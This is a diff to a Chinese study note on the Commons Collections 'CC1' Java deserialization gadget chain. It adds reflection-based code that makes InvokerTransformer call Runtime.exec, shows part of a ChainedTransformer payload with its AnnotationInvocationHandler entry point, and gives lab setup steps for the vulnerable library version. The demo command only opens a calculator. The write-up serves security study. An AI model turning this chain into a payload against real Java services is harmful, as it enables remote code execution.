@@ -37,7 +37,9 @@ CC1(commons-collections3.1-3.2.1) 链下有 `Lazymap` 和 `transformedMap` 两�
     - `transform` 方法(public): 反射获取类下方法,并返回invoke(实参)调用结果
     - 当参数是一个数组时, 对每个参数调用 `transform` 方法.
 
-以上的类都是对接口 `Transformer` 接口类的实现,
+以上的类都是对接口 `Transformer` 接口类的实现(ctrl+H 查看实现类)
+
+![Untitled](CC1%E9%93%BE%20ad69119d616143c886a2aca12c8b6832/Untitled.png)
 
 ### `Constantransformer` 类
 
@@ -73,7 +75,7 @@ public Object transform(Object input) {
     }
 ```
 
-其中这两行一眼反射
+其中这两行一眼反射, 参数均可控,所以是任意方法调用
 
 ```java
 Class cls = input.getClass();
@@ -96,7 +98,14 @@ private InvokerTransformer(String methodName) {
     }
 ```
 
-所以, payload构造时:
+测试一下该类的反射
+
+```java
+Runtime r = Runtime.getRuntime();
+new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}).transform(r);
+```
+
+对应的 payload部分
 
 ```java
 Transformer transformerChain = new ChainedTransformer(new Transformer[]{
@@ -108,6 +117,12 @@ new InvokerTransformer("exec", new Class[]{String.class}, new Object[] {"calc.ex
 ```
 
 利用链入口点: `sun.reflect.annotation.AnnotationInvocationHandler#readObject` 
+
+### ChainedTransformer
+
+是transform接口的继承类 链式调用transform
+
+![Untitled](CC1%E9%93%BE%20ad69119d616143c886a2aca12c8b6832/Untitled%201.png)
 
 ## 利用链
 
@@ -283,6 +298,38 @@ Object o = (Object) constructor.newInstance(Override.class,proxyMap);
 serialize(o);
 unserialize();
 ```
+
+## 环境搭建
+
+1. 下载openjdk指定版本([https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4](https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4) ) 
+
+将里面的 `\jdk-af660750b2f4\jdk-af660750b2f4\src\share\classes\sun` 复制出来
+
+1. 下载oracle ****Java SE Development Kit 8u65 (****[https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html) ) 解压jdk目录下的src压缩包, 将openjdk里的sun包导入到src里
+
+![Untitled](CC1%E9%93%BE%20ad69119d616143c886a2aca12c8b6832/Untitled%202.png)
+
+1. 打开idea, 在project setting→ SDKs 添加第二个步骤解压的src目录
+
+![Untitled](CC1%E9%93%BE%20ad69119d616143c886a2aca12c8b6832/Untitled%203.png)
+
+1. maven 3.2.1
+
+```java
+<dependency>
+    <groupId>commons-collections</groupId>
+    <artifactId>commons-collections</artifactId>
+    <version>3.2.1</version>
+</dependency>
+```
+
+### 调试流程
+
+新建一个项目 如图
+
+![Untitled](CC1%E9%93%BE%20ad69119d616143c886a2aca12c8b6832/Untitled%204.png)
+
+编辑pom.xml 添加刚刚的cc1的版本依赖
 
 ## 修复
 
